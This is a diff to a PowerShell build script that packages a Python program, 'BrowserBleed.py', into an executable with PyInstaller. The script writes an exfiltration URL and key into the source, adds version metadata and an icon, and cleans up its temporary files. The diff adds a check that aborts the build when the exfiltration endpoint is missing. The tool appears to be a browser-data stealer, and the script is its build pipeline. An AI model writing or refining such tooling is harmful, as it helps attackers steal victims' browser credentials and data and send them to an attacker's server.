@@ -247,10 +247,14 @@ if ($IconFile) { Write-Host "    Icon:         $IconFile" }
 $src    = Join-Path $PSScriptRoot "BrowserBleed.py"
 $tmpSrc = Join-Path $env:TEMP "BrowserBleed_build.py"
 
-(Get-Content $src -Raw) `
+$patched = (Get-Content $src -Raw) `
     -replace '_EXFIL_URL: str = ""', "_EXFIL_URL: str = `"$ExfilUrl`"" `
-    -replace '_EXFIL_KEY: str = ""', "_EXFIL_KEY: str = `"$ExfilKey`"" |
-    Set-Content -Path $tmpSrc -Encoding utf8
+    -replace '_EXFIL_KEY: str = ""', "_EXFIL_KEY: str = `"$ExfilKey`""
+if ($patched -notmatch [regex]::Escape($ExfilUrl) -or $patched -notmatch [regex]::Escape($ExfilKey)) {
+    Write-Error "Substitution failed - URL/key not found in patched source. Aborting."
+    exit 1
+}
+$patched | Set-Content -Path $tmpSrc -Encoding utf8
 
 # ── Generate version-info file ────────────────────────────────────────────────
 $verFile = Join-Path $env:TEMP "bb_version.txt"
@@ -290,7 +294,7 @@ python -m PyInstaller `
     --specpath $buildTmp `
     $tmpSrc
 
-Remove-Item $tmpSrc   -Force -ErrorAction SilentlyContinue
+Remove-Item $tmpSrc  -Force -ErrorAction SilentlyContinue
 Remove-Item $verFile  -Force -ErrorAction SilentlyContinue
 Remove-Item $buildTmp -Recurse -Force -ErrorAction SilentlyContinue
 
